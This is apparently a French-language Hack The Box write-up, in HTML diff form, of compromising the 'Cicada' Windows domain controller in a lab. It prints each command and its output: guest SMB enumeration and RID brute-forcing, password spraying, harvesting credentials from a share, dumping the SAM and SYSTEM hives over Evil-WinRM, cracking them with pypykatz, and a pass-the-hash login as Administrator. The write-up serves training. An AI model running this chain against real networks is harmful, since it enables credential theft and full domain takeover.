+<h3 id="common-name-cicada-dccicadahtb">Common Name: CICADA-DC.cicada.htb<a hidden class="anchor" aria-hidden="true" href="#common-name-cicada-dccicadahtb">#</a></h3>
+<ul>
+<li><strong>Issuer:</strong> CICADA-DC-CA/domainComponent=cicada</li>
+<li><strong>Public Key Type:</strong> RSA</li>
+<li><strong>Public Key Bits:</strong> 2048</li>
+<li><strong>Valid From:</strong> 2024-08-22 20:24:16</li>
+<li><strong>Valid Until:</strong> 2025-08-22 20:24:16</li>
+<li><strong>SHA-1 Fingerprint:</strong> <code>2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a</code></li>
+</ul>
+<h2 id="explication-de-la-commande">Explication de la commande:<a hidden class="anchor" aria-hidden="true" href="#explication-de-la-commande">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.10.11.35 -u guest -p <span style="color:#e6db74">&#39;&#39;</span> --rid-brute --shares
+</span></span></code></pre></div><p>Cette commande est utilisée pour interagir avec un serveur SMB à l&rsquo;adresse IP <code>10.10.11.35</code> en utilisant un utilisateur <code>guest</code> sans mot de passe, tout en tentant de bruteforcer les RID (identifiants relatifs) et en énumérant les partages SMB disponibles.</p>
+<h3 id="1-nxc">1. <strong>nxc</strong><a hidden class="anchor" aria-hidden="true" href="#1-nxc">#</a></h3>
+<ul>
+<li><code>nxc</code> est un outil de ligne de commande permettant d&rsquo;interagir avec des hôtes SMB. Il est utilisé pour effectuer des tests de pénétration, des explorations ou des attaques sur des serveurs SMB. Cela permet de scanner, bruteforcer des mots de passe et exécuter diverses actions sur des partages SMB.</li>
+</ul>
+<h3 id="2-smb">2. <strong>smb</strong><a hidden class="anchor" aria-hidden="true" href="#2-smb">#</a></h3>
+<ul>
+<li>Cette option indique que la commande va utiliser le protocole SMB (Server Message Block) pour interagir avec l&rsquo;hôte distant. SMB est utilisé pour le partage de fichiers et d&rsquo;imprimantes sur un réseau local.</li>
+</ul>
+<h3 id="3-10101135">3. <strong>10.10.11.35</strong><a hidden class="anchor" aria-hidden="true" href="#3-10101135">#</a></h3>
+<ul>
+<li>Il s&rsquo;agit de l&rsquo;adresse IP de la machine cible à laquelle vous vous connectez via SMB. Cette adresse cible est <code>10.10.11.35</code>.</li>
+</ul>
+<h3 id="4--u-guest">4. <strong>-u guest</strong><a hidden class="anchor" aria-hidden="true" href="#4--u-guest">#</a></h3>
+<ul>
+<li>L&rsquo;option <code>-u</code> spécifie l&rsquo;utilisateur avec lequel vous tentez de vous connecter au serveur SMB. Dans ce cas, l&rsquo;utilisateur est <code>guest</code>, un compte souvent utilisé pour l&rsquo;accès limité ou public aux ressources partagées.</li>
+</ul>
+<h3 id="5--p-">5. <strong>-p &lsquo;&rsquo;</strong><a hidden class="anchor" aria-hidden="true" href="#5--p-">#</a></h3>
+<ul>
+<li>L&rsquo;option <code>-p</code> définit le mot de passe associé à l&rsquo;utilisateur spécifié. Ici, le mot de passe est vide (<code>''</code>), ce qui signifie que la commande tente de se connecter avec l&rsquo;utilisateur <code>guest</code> sans mot de passe.</li>
+</ul>
+<h3 id="6---rid-brute">6. <strong>&ndash;rid-brute</strong><a hidden class="anchor" aria-hidden="true" href="#6---rid-brute">#</a></h3>
+<ul>
+<li>L&rsquo;option <code>--rid-brute</code> active le bruteforce des RID (Relative Identifier). Un RID est un identifiant unique attribué à chaque utilisateur ou groupe dans un domaine Windows. Cette option permet de tester plusieurs RID pour énumérer les utilisateurs sur le serveur SMB cible.</li>
+</ul>
+<h3 id="7---shares">7. <strong>&ndash;shares</strong><a hidden class="anchor" aria-hidden="true" href="#7---shares">#</a></h3>
+<ul>
+<li>L&rsquo;option <code>--shares</code> permet d&rsquo;énumérer les partages SMB disponibles sur le serveur cible. Un partage SMB est une ressource partagée (dossier, imprimante, etc.) accessible à partir du réseau. Cette option liste tous les partages disponibles sur la machine cible.</li>
+</ul>
+<h2 id="ce-que-fait-cette-commande-">Ce que fait cette commande :<a hidden class="anchor" aria-hidden="true" href="#ce-que-fait-cette-commande-">#</a></h2>
+<ol>
+<li><strong>Connexion au serveur SMB</strong> : La commande tente de se connecter au serveur SMB à l&rsquo;adresse IP <code>10.10.11.35</code> avec l&rsquo;utilisateur <code>guest</code> sans mot de passe.</li>
+<li><strong>Bruteforce des RID</strong> : Elle effectue un bruteforce sur les RID pour énumérer les utilisateurs présents sur le serveur cible.</li>
+<li><strong>Énumération des partages</strong> : Elle liste les partages SMB disponibles sur le serveur cible.</li>
+<li><strong>Affichage des résultats</strong> : Si la commande réussit, elle affiche les partages et les utilisateurs trouvés sur la machine cible.</li>
+</ol>
+<h2 id="exemple-de-sortie-attendue-">Exemple de sortie attendue :<a hidden class="anchor" aria-hidden="true" href="#exemple-de-sortie-attendue-">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Thu Mar <span style="color:#ae81ff">14</span> 13:29:09 <span style="color:#ae81ff">2024</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Thu Mar <span style="color:#ae81ff">14</span> 13:21:29 <span style="color:#ae81ff">2024</span>
+</span></span><span style="display:flex;"><span>  Notice from HR.txt                  A     <span style="color:#ae81ff">1266</span>  Wed Aug <span style="color:#ae81ff">28</span> 19:31:48 <span style="color:#ae81ff">2024</span>
+</span></span></code></pre></div><p>Dans cet exemple, la commande a trouvé un fichier <code>Notice from HR.txt</code> dans le répertoire <code>HR</code> sur le serveur SMB.</p>
+<p>On y voit un mot de passe sans nom d&rsquo;utilisateur</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>scanner/smb/smb_login<span style="color:#f92672">)</span> &gt; exploit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.11.35:445       - 10.10.11.35:445 - Starting SMB login bruteforce
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> 10.10.11.35:445       - 10.10.11.35:445 - Failed: <span style="color:#e6db74">&#39;.\Administrator:Cicada$M6xxxxxxxxxxxxxx&#39;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> 10.10.11.35:445       - No active DB -- Credential data will not be saved!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> 10.10.11.35:445       - 10.10.11.35:445 - Failed: <span style="color:#e6db74">&#39;.\Guest:Cicada$M6xxxxxxxxxxxxxx,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: &#39;</span>.<span style="color:#ae81ff">\k</span>rbtgt:Cicada$M6xxxxxxxxxxxxxx<span style="color:#e6db74">&#39;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: &#39;</span>.<span style="color:#ae81ff">\C</span>ICADA-DC$ :Cicada$M6xxxxxxxxxxxxxx<span style="color:#e6db74">&#39;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: &#39;</span>.<span style="color:#ae81ff">\j</span>ohn.smoulder:Cicada$M6xxxxxxxxxxxxxx<span style="color:#e6db74">&#39;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: &#39;</span>.<span style="color:#ae81ff">\s</span>arah.dantelia:Cicada$M6xxxxxxxxxxxxxx<span style="color:#e6db74">&#39;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] 10.10.11.35:445       - 10.10.11.35:445 - Success: &#39;</span>.<span style="color:#ae81ff">\m</span>ichael.wrightson:Cicada$M6xxxxxxxxxxxxxx<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] SMB session 1 opened (10.10.14.204:44061 -&gt; 10.10.11.35:445) at 2025-01-25 22:17:40 +0100
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: &#39;</span>.<span style="color:#ae81ff">\d</span>avid.orelious:Cicada$M6xxxxxxxxxxxxxx,
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> 10.10.11.35:445       - 10.10.11.35:445 - Failed: <span style="color:#e6db74">&#39;.\emily.oscars:Cicada$M6xxxxxxxxxxxxxx&#39;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.11.35:445       - Scanned <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> hosts <span style="color:#f92672">(</span>100% complete<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.11.35:445       - Bruteforce completed, <span style="color:#ae81ff">1</span> credential was successful.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.11.35:445       - <span style="color:#ae81ff">1</span> SMB session was opened successfully.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Auxiliary module execution completed
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb 10.10.11.35 -u michael.wrightson -p <span style="color:#e6db74">&#39;Cicada$M6xxxxxxxxxxxxxx&#39;</span> --users --rid-brute
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:CICADA-DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:cicada.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>                                                                                                                                           
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> cicada.htb<span style="color:#ae81ff">\m</span>ichael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                         
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        Administrator                 2024-08-26 20:08:03 <span style="color:#ae81ff">12</span>      Built-in account <span style="color:#66d9ef">for</span> administering the computer/domain                                                                                                                                    
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        Guest                         2024-08-28 17:26:56 <span style="color:#ae81ff">0</span>       Built-in account <span style="color:#66d9ef">for</span> guest access to the computer/domain                                                                                                                                  
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        krbtgt                        2024-03-14 11:14:10 <span style="color:#ae81ff">2</span>       Key Distribution Center Service Account                                                                                                                                                   
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 <span style="color:#ae81ff">12</span>       
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 <span style="color:#ae81ff">12</span>       
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 <span style="color:#ae81ff">0</span>        
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        david.orelious                2024-03-14 12:17:29 <span style="color:#ae81ff">12</span>      Just in <span style="color:#66d9ef">case</span> I forget my password is aRtxxxxxxxxx                                                                                                                                       
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 <span style="color:#ae81ff">12</span>       
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated <span style="color:#ae81ff">8</span> local users: CICADA
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        498: CICADA<span style="color:#ae81ff">\E</span>nterprise Read-only Domain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        500: CICADA<span style="color:#ae81ff">\A</span>dministrator <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        501: CICADA<span style="color:#ae81ff">\G</span>uest <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        502: CICADA<span style="color:#ae81ff">\k</span>rbtgt <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        512: CICADA<span style="color:#ae81ff">\D</span>omain Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        513: CICADA<span style="color:#ae81ff">\D</span>omain Users <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        514: CICADA<span style="color:#ae81ff">\D</span>omain Guests <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        515: CICADA<span style="color:#ae81ff">\D</span>omain Computers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        516: CICADA<span style="color:#ae81ff">\D</span>omain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        517: CICADA<span style="color:#ae81ff">\C</span>ert Publishers <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        518: CICADA<span style="color:#ae81ff">\S</span>chema Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        519: CICADA<span style="color:#ae81ff">\E</span>nterprise Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        520: CICADA<span style="color:#ae81ff">\G</span>roup Policy Creator Owners <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        521: CICADA<span style="color:#ae81ff">\R</span>ead-only Domain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        522: CICADA<span style="color:#ae81ff">\C</span>loneable Domain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        525: CICADA<span style="color:#ae81ff">\P</span>rotected Users <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        526: CICADA<span style="color:#ae81ff">\K</span>ey Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        527: CICADA<span style="color:#ae81ff">\E</span>nterprise Key Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        553: CICADA<span style="color:#ae81ff">\R</span>AS and IAS Servers <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        571: CICADA<span style="color:#ae81ff">\A</span>llowed RODC Password Replication Group <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        572: CICADA<span style="color:#ae81ff">\D</span>enied RODC Password Replication Group <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        1000: CICADA<span style="color:#ae81ff">\C</span>ICADA-DC$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        1101: CICADA<span style="color:#ae81ff">\D</span>nsAdmins <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        1102: CICADA<span style="color:#ae81ff">\D</span>nsUpdateProxy <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        1103: CICADA<span style="color:#ae81ff">\G</span>roups <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        1104: CICADA<span style="color:#ae81ff">\j</span>ohn.smoulder <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        1105: CICADA<span style="color:#ae81ff">\s</span>arah.dantelia <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        1106: CICADA<span style="color:#ae81ff">\m</span>ichael.wrightson <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        1108: CICADA<span style="color:#ae81ff">\d</span>avid.orelious <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        1109: CICADA<span style="color:#ae81ff">\D</span>ev Support <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        1601: CICADA<span style="color:#ae81ff">\e</span>mily.oscars <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>┌──(keylloger㉿Kali)-[~/…/VM/HTB/EASY/Cicada]
+</span></span><span style="display:flex;"><span>└─$ smbclient //10.10.11.35/DEV -U david.orelious                                                 
+</span></span><span style="display:flex;"><span>Password for [WORKGROUP\david.orelious]:
+</span></span><span style="display:flex;"><span>Try &#34;help&#34; to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: \&gt; ls
+</span></span><span style="display:flex;"><span>  .                                   D        0  Thu Mar 14 13:31:39 2024
+</span></span><span style="display:flex;"><span>  ..                                  D        0  Thu Mar 14 13:21:29 2024
+</span></span><span style="display:flex;"><span>  Backup_script.ps1                   A      601  Wed Aug 28 19:28:22 2024
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                4168447 blocks of size 4096. 377922 blocks available
+</span></span><span style="display:flex;"><span>smb: \&gt; mget Backup_script.ps1 
+</span></span><span style="display:flex;"><span>Get file Backup_script.ps1? y
+</span></span><span style="display:flex;"><span>getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (5,5 KiloBytes/sec) (average 5,5 KiloBytes/sec)
+</span></span><span style="display:flex;"><span>smb: \&gt; ^C
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                
+</span></span><span style="display:flex;"><span>┌──(keylloger㉿Kali)-[~/…/VM/HTB/EASY/Cicada]
+</span></span><span style="display:flex;"><span>└─$ cat Backup_script.ps1   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$sourceDirectory = &#34;C:\smb&#34;
+</span></span><span style="display:flex;"><span>$destinationDirectory = &#34;D:\Backup&#34;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$username = &#34;emily.oscars&#34;
+</span></span><span style="display:flex;"><span>$password = ConvertTo-SecureString &#34;Q!3@Lpxxxxxxxxxx&#34; -AsPlainText -Force
+</span></span><span style="display:flex;"><span>$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
+</span></span><span style="display:flex;"><span>$dateStamp = Get-Date -Format &#34;yyyyMMdd_HHmmss&#34;
+</span></span><span style="display:flex;"><span>$backupFileName = &#34;smb_backup_$dateStamp.zip&#34;
+</span></span><span style="display:flex;"><span>$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
+</span></span><span style="display:flex;"><span>Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
+</span></span><span style="display:flex;"><span>Write-Host &#34;Backup completed successfully. Backup file saved to: $backupFilePath&#34;
+</span></span></code></pre></div><p>Pour la privesc je vous redirige vers ceci : <a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/?source=post_page-----0ebda6a51519--------------------------------">https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/?source=post_page-----0ebda6a51519--------------------------------</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Evil-WinRM* PS C:\Users\emily.oscars.CICADA&gt; mkdir Temp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Users\emily.oscars.CICADA
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                 LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                 -------------         ------ ----
+</span></span><span style="display:flex;"><span>d-----         <span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">26</span>/<span style="color:#ae81ff">2025</span>  <span style="color:#ae81ff">12</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">06</span> AM                Temp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\emily.oscars.CICADA&gt; cd Temp
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Temp&gt; reg save hklm\sam C:\Users\emily.oscars.CICADA\Temp\sam
+</span></span><span style="display:flex;"><span>The operation completed successfully.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Temp&gt; reg save hklm\system C:\Users\emily.oscars.CICADA\Temp\system
+</span></span><span style="display:flex;"><span>The operation completed successfully.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Temp&gt; download sam
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info<span style="color:#960050;background-color:#1e0010">:</span> Downloading C:\Users\emily.oscars.CICADA\Temp\sam to sam
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info<span style="color:#960050;background-color:#1e0010">:</span> Download successful!
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Temp&gt; download system
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info<span style="color:#960050;background-color:#1e0010">:</span> Downloading C:\Users\emily.oscars.CICADA\Temp\system to system
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info<span style="color:#960050;background-color:#1e0010">:</span> Download successful!
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>pypykatz registry --sam sam system                                                                   
+</span></span><span style="display:flex;"><span>WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
+</span></span><span style="display:flex;"><span>WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
+</span></span><span style="display:flex;"><span>============== SYSTEM hive secrets ==============
+</span></span><span style="display:flex;"><span>CurrentControlSet: ControlSet001
+</span></span><span style="display:flex;"><span>Boot Key: 3c2b033757a49110a9ee680b46e8d620
+</span></span><span style="display:flex;"><span>============== SAM hive secrets ==============
+</span></span><span style="display:flex;"><span>HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
+</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87xxxxxxxxxxxxxxxxxxxxxx:::
+</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>┌──(keylloger㉿Kali)-[~/…/VM/HTB/EASY/Cicada]
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i 10.10.11.35 -u Administrator -H &#39;2b87e7c93axxxxxxxxxxxxxxxxxxxxxxx&#39;
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
+</span></span><span style="display:flex;"><span>a193211xxxxxxxxxxxxxxxxxxxxxxxxxx
